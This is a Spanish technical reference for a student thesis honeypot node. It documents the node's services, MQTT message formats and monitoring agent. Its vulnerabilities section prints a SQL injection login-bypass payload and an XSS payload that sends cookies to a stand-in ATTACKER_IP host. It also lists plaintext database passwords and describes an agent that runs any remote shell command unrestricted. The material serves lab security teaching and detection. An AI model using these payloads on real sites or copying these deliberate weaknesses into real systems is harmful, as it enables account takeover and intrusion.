# PI-4 — Nodo Protegido · Referencia Técnica Completa
**Proyecto Sentinel IT | TFG ASIR | Autor: Félix Tejedor**

---

## Índice

1. [Datos de red e identidad](#1-datos-de-red-e-identidad)
2. [Arquitectura de servicios](#2-arquitectura-de-servicios)
3. [Conexión con AWS IoT Core (MQTT)](#3-conexión-con-aws-iot-core-mqtt)
4. [Topics MQTT — formatos de mensaje](#4-topics-mqtt--formatos-de-mensaje)
5. [Web Honeypot CyberGuard / SentinelIT](#5-web-honeypot-cyberguard--sentinelit)
6. [Vulnerabilidades intencionadas](#6-vulnerabilidades-intencionadas)
7. [Agente monitor (agente_monitor.py)](#7-agente-monitor-agente_monitorpy)
8. [Control remoto desde PI-5](#8-control-remoto-desde-pi-5)
9. [Diagrama de arquitectura completa](#9-diagrama-de-arquitectura-completa)
10. [Flujo de un ataque de extremo a extremo](#10-flujo-de-un-ataque-de-extremo-a-extremo)

---

## 1. Datos de red e identidad

| Campo | Valor |
|-------|-------|
| **Dirección IP** | `192.168.1.135` |
| **Usuario del sistema** | `lopex` |
| **Hostname** | `sonic` |
| **Dominio DNS local** | `auditorsentinelti.com` |
| **Resolución** | `auditorsentinelti.com` → `192.168.1.135` (vía dnsmasq) |
| **Ubicación física** | Casa 1 — Félix Tejedor |

---

## 2. Arquitectura de servicios

PI-4 ejecuta varios servicios en paralelo, cada uno con un papel diferente en el honeypot:

```
Internet / Red local
        │
        ▼ puerto 80
   ┌──────────┐
   │  Nginx   │   ← Proxy inverso (captura IP real del cliente)
   └────┬─────┘
        │ proxy_pass → puerto 8080
        ▼
   ┌──────────┐
   │  Apache  │   ← Servidor web interno (PHP + mod_remoteip)
   └────┬─────┘
        │
        ▼
   ┌──────────┐
   │ MariaDB  │   ← Base de datos de la aplicación web
   └──────────┘

Otros servicios independientes:
   ┌──────────┐   ┌──────────┐   ┌──────────┐
   │ vsftpd   │   │   SSH    │   │ dnsmasq  │
   │ (FTP)    │   │ (port 22)│   │  (DNS)   │
   └──────────┘   └──────────┘   └──────────┘
```

### 2.1 Nginx — proxy inverso

- **Puerto de escucha:** 80 (HTTP público)
- **Destino:** `proxy_pass http://192.168.1.135:8080`
- **Headers añadidos:**
  - `X-Real-IP` — IP real del cliente
  - `X-Forwarded-For` — cadena de proxies
- **Por qué es crítico:** sin este proxy, Apache solo vería la IP local (`127.0.0.1`). Con él, se captura la IP del atacante y se puede bloquear/reportar.

### 2.2 Apache — servidor web interno

- **Puerto de escucha:** 8080 (solo accesible internamente vía Nginx)
- **Módulo activo:** `mod_remoteip` — lee `X-Real-IP` y la pone como IP del cliente en los logs
- **Formato de log configurado:**
  ```apache
  LogFormat "%a %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" proxy_combined
  ```
  El `%a` registra la IP real del cliente (no la del proxy).
- **Log de acceso:** `/var/log/apache2/access.log`
- **Tecnología web servida:** PHP (aplicación CyberGuard/SentinelIT)

### 2.3 dnsmasq — servidor DNS local

- **Interfaces:** `eth0`, escucha en `127.0.0.1` y `192.168.1.135`
- **Entrada en `/etc/hosts`:**
  ```
  192.168.1.135  auditorsentinelti.com
  ```
- **Función:** permite acceder al honeypot por nombre de dominio dentro de la red local, sin necesidad de DNS público.

### 2.4 vsftpd — servidor FTP

| Parámetro | Valor |
|-----------|-------|
| `write_enable` | YES |
| `anonymous_enable` | NO |
| `chroot_local_user` | YES |
| `allow_writeable_chroot` | YES |
| `xferlog_enable` | YES |
| **Log de acceso** | `/var/log/vsftpd.log` |

- Requiere credenciales válidas del sistema.
- Los intentos fallidos se monitorizan y se reportan al agente monitor.

### 2.5 MariaDB / MySQL

| Campo | Valor |
|-------|-------|
| **Base de datos** | `cyberguard` |
| **Usuario aplicación** | `cyber_user` |
| **Contraseña aplicación** | `C0ntr4senAs3gur4` |
| **Contraseña root** | `C0ntr4senAs3gur4` |
| **Schema** | `/var/www/html/sentinelti.com/schema.sql` |

### 2.6 SSH

- Servicio estándar en puerto 22.
- Cada fallo de autenticación genera un evento MQTT enviado a PI-5.
- El escalado de prioridad funciona por IP (ver sección 4.3).

---

## 3. Conexión con AWS IoT Core (MQTT)

PI-4 se conecta a AWS IoT Core con autenticación mTLS (certificado X.509 mutuo).

| Campo | Valor |
|-------|-------|
| **Client ID** | `Pi4-Felix` |
| **Endpoint** | `aj4wsdnimoej8-ats.iot.eu-north-1.amazonaws.com` |
| **Certificado** | `Pi4-Felix.cert.pem` |
| **Clave privada** | `Pi4-Felix.private.key` |
| **CA raíz** | `root-CA.crt` (Amazon Root CA) |
| **Puerto** | 8883 (MQTT sobre TLS) |

El mismo endpoint es compartido con PI-5 (`Pi5-dani`) y el Dashboard (`Dashboard-SOC-Pi5`). La política IAM en AWS controla qué topics puede publicar/suscribir cada cliente.

---

## 4. Topics MQTT — formatos de mensaje

### 4.1 Topics que publica PI-4

```
seguridad/clientel/telemetria    →  Resúmenes periódicos (baja prioridad)
seguridad/clientel/eventos       →  Eventos de seguridad en tiempo real
```

PI-5 está suscrito a `seguridad/#` y recibe ambos.

### 4.2 Formato — mensaje de telemetría

Resúmenes enviados periódicamente con el consolidado de accesos FTP o web:

```json
{
  "timestamp": "2026-04-21T10:30:00Z",
  "sensor": "Pi4-Felix",
  "tipo": "RESUMEN_ACCESOS_FTP",
  "total_intentos": 47,
  "detalles": [
    {"ip": "192.168.1.20", "ruta": "/ftp/archivos", "t": "2026-04-21T10:15:00Z"},
    {"ip": "10.0.0.5",     "ruta": "/ftp/admin",    "t": "2026-04-21T10:22:00Z"}
  ]
}
```

Valores posibles de `tipo`:
- `"RESUMEN_ACCESOS_FTP"` — intentos de acceso al servidor FTP
- `"RESUMEN_ACCESOS_WEB"` — peticiones al servidor Apache/Nginx

### 4.3 Formato — mensaje de evento

Eventos individuales de seguridad enviados inmediatamente:

```json
{
  "ip": "192.168.1.99",
  "user": "root",
  "timestamp": "2026-04-21T10:31:05Z",
  "evento": "FALLO_SSH",
  "prioridad": "ALTA"
}
```

Valores posibles de `evento`:
- `"FALLO_SSH"` — intento SSH fallido
- `"LOGIN_EXITOSO"` — acceso SSH exitoso
- `"FALLO_FTP"` — intento FTP fallido
- `"ACCESO_WEB_SOSPECHOSO"` — patrón web anómalo detectado

### 4.4 Lógica de prioridad (escalado)

| Prioridad | Condición de disparo |
|-----------|---------------------|
| `"BAJA"` | Un fallo puntual desde una IP / recarga seguida de página |
| `"MEDIA"` | Fallos consecutivos / intento a usuario `root` |
| `"ALTA"` | Triple fallo a `root` / patrón de fuerza bruta / DDoS detectado |

**Ejemplo de escalado SSH para una misma IP:**

```
Intento 1: FALLO_SSH usuario=admin      → prioridad BAJA
Intento 2: FALLO_SSH usuario=root       → prioridad MEDIA  (usuario sensible)
Intento 3: FALLO_SSH usuario=root       → prioridad ALTA   (triple fallo a root)
           ↑ PI-5 recibe ALTA → Triage Agent analiza → posible bloqueo iptables
```

### 4.5 Topic que escucha PI-4 (comandos desde PI-5)

```
comandos/Pi4-Felix    ←  PI-5 publica acciones remotas aquí
```

Formato del mensaje de comando:

```json
{
  "accion": "ejecutar_comando",
  "comando": "sudo iptables -A INPUT -s 192.168.1.99 -j DROP",
  "motivo": "Bloqueo por fuerza bruta SSH detectada por PI-5"
}
```

---

## 5. Web Honeypot CyberGuard / SentinelIT

### 5.1 Descripción

Aplicación web PHP simulando un panel de administración empresarial con credenciales y datos sensibles. Diseñada para atraer atacantes y registrar sus técnicas.

| Campo | Valor |
|-------|-------|
| **Ruta en PI-4** | `/var/www/html/sentinelti.com/` |
| **URL de acceso** | `http://auditorsentinelti.com` |
| **Tecnología** | PHP + Apache (8080) + MariaDB |
| **Logs web propios** | `/var/www/html/sentinelti.com/logs/` (permisos 755, owner `www-data`) |

### 5.2 Archivos clave de la aplicación

| Archivo | Función |
|---------|---------|
| `login.php` | Página de inicio de sesión (**contiene la SQLi intencionada**) |
| `panel.php` | Panel de usuario autenticado |
| `admin.php` | Panel de administración (acceso restringido) |
| `sugerencias.php` | Panel de comentarios (**contiene el XSS intencionado**) |
| `loggers.php` | Registro de actividad interna |
| `logout.php` | Cierre de sesión |
| `cerrar_sesion_admin.php` | Script CLI para gestión de sesiones desde PI-5 |
| `schema.sql` | Schema de la base de datos `cyberguard` |

---

## 6. Vulnerabilidades intencionadas

PI-4 implementa tres vulnerabilidades deliberadas para los escenarios de prueba del TFG:

### 6.1 SQL Injection — login.php (campo email)

La consulta de autenticación no usa prepared statements, lo que permite inyectar SQL.

**Payload de explotación:**
```
a@a.com' UNION SELECT 1, 'Hacker', '202cb962ac59075b964b07152d234b70', 'admin' -- -
```

**Cómo funciona:**

```sql
-- Consulta original vulnerable (simplificada):
SELECT id, nombre, password, rol FROM usuarios WHERE email = '[INPUT]'

-- Con el payload inyectado queda:
SELECT id, nombre, password, rol FROM usuarios WHERE email = 'a@a.com'
UNION SELECT 1, 'Hacker', '202cb962ac59075b964b07152d234b70', 'admin' -- -'

-- Resultado: devuelve una fila falsa con rol='admin'
-- El hash 202cb962ac59075b964b07152d234b70 = MD5("123")
-- → El atacante introduce contraseña "123" y accede como admin
```

**Evidencia en logs:** Apache registra la petición POST con el payload. El agente monitor lo detecta y envía evento `ACCESO_WEB_SOSPECHOSO` con prioridad ALTA a PI-5.

### 6.2 Cross-Site Scripting (XSS) — sugerencias.php

El panel de sugerencias renderiza el input del usuario directamente en HTML **sin sanitización**.

**Payload básico:**
```html
<script>alert('XSS')</script>
```

**Payload de robo de cookie (Session Hijacking):**
```html
<script>
  document.location='http://ATTACKER_IP/steal?cookie='+document.cookie
</script>
```

**Cómo funciona:** cualquier usuario que visite el panel de sugerencias tras el envío ejecuta el script en su navegador. Si es un administrador, su cookie de sesión puede ser robada.

### 6.3 Session Hijacking — encadenado con XSS

1. El atacante envía el payload XSS de robo de cookie desde `sugerencias.php`.
2. Un administrador visita el panel → su navegador ejecuta el script → cookie enviada al atacante.
3. El atacante usa esa cookie en su navegador (`document.cookie = 'PHPSESSID=...'`) para suplantar la sesión del admin sin necesidad de contraseña.

**Gestión de sesiones desde PI-5** (usando `execute_remote_command()`):
```bash
# Listar todas las sesiones activas
php /var/www/html/sentinelti.com/cerrar_sesion_admin.php --listar

# Cerrar sesión comprometida por ID de usuario
php /var/www/html/sentinelti.com/cerrar_sesion_admin.php --cerrar-usuario 1

# Cerrar sesión comprometida por nombre
php /var/www/html/sentinelti.com/cerrar_sesion_admin.php --cerrar-nombre "Admin"
```

---

## 7. Agente monitor (agente_monitor.py)

### 7.1 Ubicación y función

- **Archivo:** `~/connect_device/agente_monitor.py`
- **Función:** proceso Python que corre en PI-4 de forma continua, monitorizando los logs del sistema y enviando eventos/telemetría a AWS IoT Core.

### 7.2 Fuentes de log monitorizadas

| Fuente | Log | Eventos generados |
|--------|-----|-------------------|
| Apache | `/var/log/apache2/access.log` | Peticiones web sospechosas |
| vsftpd | `/var/log/vsftpd.log` | Intentos FTP fallidos |
| SSH | `journald` / `/var/log/auth.log` | Fallos de autenticación SSH |
| Web app | `/var/www/html/sentinelti.com/logs/` | Actividad de la aplicación PHP |

### 7.3 Flujo de procesamiento

```
Log del sistema (tail -f)
        │
        ▼
  Parseo y análisis
  (¿es sospechoso?)
        │
   ┌────┴────┐
   │         │
   ▼         ▼
Evento    Telemetría
(inmediato) (periódica)
   │         │
   └────┬────┘
        ▼
  AWS IoT Core MQTT
  seguridad/clientel/eventos
  seguridad/clientel/telemetria
        │
        ▼
       PI-5 (coordinador SOC)
```

---

## 8. Control remoto desde PI-5

PI-5 tiene acceso total a la shell de PI-4 a través de la tool `execute_remote_command()`, que publica un mensaje MQTT en `comandos/Pi4-Felix`. El agente monitor de PI-4 escucha ese topic y ejecuta el comando recibido.

**No hay restricción de comandos** — PI-5 puede ejecutar cualquier script bash.

### 8.1 Casos de uso habituales

```bash
# Bloqueo de IP por iptables (lo hace normalmente el tool block_ip de PI-5)
sudo iptables -A INPUT -s 192.168.1.99 -j DROP

# Verificar que el bloqueo está activo
sudo iptables -L INPUT -n | grep 192.168.1.99

# Revertir un bloqueo (también disponible desde el Dashboard SOC)
sudo iptables -D INPUT -s 192.168.1.99 -j DROP

# Ver las últimas líneas del log de Apache
tail -n 50 /var/log/apache2/access.log

# Ver sesiones activas de la web
php /var/www/html/sentinelti.com/cerrar_sesion_admin.php --listar

# Cerrar sesión comprometida
php /var/www/html/sentinelti.com/cerrar_sesion_admin.php --cerrar-nombre "Admin"

# Reiniciar el servicio Nginx
sudo systemctl restart nginx

# Ver estado de todos los servicios
sudo systemctl status nginx apache2 vsftpd ssh mariadb
```

### 8.2 Implementación en PI-5

La tool `execute_remote_command()` en `PI-5/src/tools/iot_tools.py` publica este payload:

```python
{
    "accion": "ejecutar_comando",
    "comando": comando,   # string con el comando bash
    "motivo": motivo      # string descriptivo para el log
}
```

Topic de destino: `comandos/Pi4-Felix` (formado como `topic_actions_base + device_id`).

---

## 9. Diagrama de arquitectura completa

```
┌─────────────────────────────────────────────────────────┐
│                   PI-4 — 192.168.1.135                  │
│                   (hostname: sonic)                      │
│                                                          │
│  ┌────────────────────────────────────────────────────┐  │
│  │                  CAPA WEB                          │  │
│  │                                                    │  │
│  │  Puerto 80   ┌─────────┐    Puerto 8080            │  │
│  │  ──────────► │  Nginx  │──────────────► Apache     │  │
│  │              │(proxy)  │               │           │  │
│  │              └─────────┘               ▼           │  │
│  │                                   PHP App          │  │
│  │                                (CyberGuard)        │  │
│  │                                        │           │  │
│  │                                        ▼           │  │
│  │                                   MariaDB          │  │
│  │                                  (cyberguard)      │  │
│  └────────────────────────────────────────────────────┘  │
│                                                          │
│  ┌────────────────────────────────────────────────────┐  │
│  │               OTROS SERVICIOS                      │  │
│  │  FTP (vsftpd:21)  │  SSH (:22)  │  DNS (dnsmasq)  │  │
│  └────────────────────────────────────────────────────┘  │
│                                                          │
│  ┌────────────────────────────────────────────────────┐  │
│  │           agente_monitor.py (daemon)               │  │
│  │  Lee: access.log / vsftpd.log / auth.log / web logs│  │
│  │  Publica eventos/telemetría → AWS IoT Core (MQTT)  │  │
│  │  Escucha comandos ← comandos/Pi4-Felix             │  │
│  └────────────────────────────────────────────────────┘  │
└──────────────────────────┬──────────────────────────────┘
                           │ MQTT / TLS 1.2
                           │ Puerto 8883
                           ▼
              ┌────────────────────────┐
              │    AWS IoT Core        │
              │  (eu-north-1)          │
              │  seguridad/#  (PUB PI4)│
              │  comandos/#   (SUB PI4)│
              └────────────┬───────────┘
                           │
                           ▼
              ┌────────────────────────┐
              │  PI-5 — Coordinador    │
              │  SOC (Daniel Alarcón)  │
              └────────────────────────┘
```

---

## 10. Flujo de un ataque de extremo a extremo

Ejemplo: ataque de fuerza bruta SSH seguido de intento de SQLi en la web.

```
T+0s   Atacante lanza hydra contra SSH de PI-4
       → vsftpd / auth.log registra fallos

T+1s   agente_monitor.py detecta el primer fallo
       → MQTT: seguridad/clientel/eventos
         { "evento": "FALLO_SSH", "ip": "...", "prioridad": "BAJA" }

T+5s   3er fallo a usuario root
       → MQTT: seguridad/clientel/eventos
         { "evento": "FALLO_SSH", "ip": "...", "prioridad": "ALTA" }

T+5s   PI-5 recibe el evento ALTA
       → LogBatchQueue lo encola
       → Triage Agent (Gemini/Ollama) analiza el log
       → Decide: block_ip("192.168.1.99")

T+6s   PI-5 publica en comandos/Pi4-Felix:
         { "accion": "ejecutar_comando",
           "comando": "sudo iptables -A INPUT -s 192.168.1.99 -j DROP" }

T+6s   agente_monitor.py de PI-4 recibe el comando
       → Ejecuta iptables → IP bloqueada a nivel de kernel

T+7s   Atacante intenta SQLi en login.php desde otra IP
       → Apache lo registra en access.log
       → agente_monitor.py envía MQTT evento ACCESO_WEB_SOSPECHOSO ALTA

T+8s   PI-5 analiza → registra en BD → posible nuevo bloqueo

T+10s  Dashboard SOC (Flask) refresca vía AJAX
       → Muestra ambos incidentes en la tabla de logs
       → Threat Level sube a rojo
       → El analista puede revertir el bloqueo manualmente
```

---

*Documento generado a partir de la documentación técnica del TFG Sentinel IT (2026).*
*PI-4 desarrollado por Félix Tejedor — PI-5 y coordinación por Daniel Alarcón Perea.*
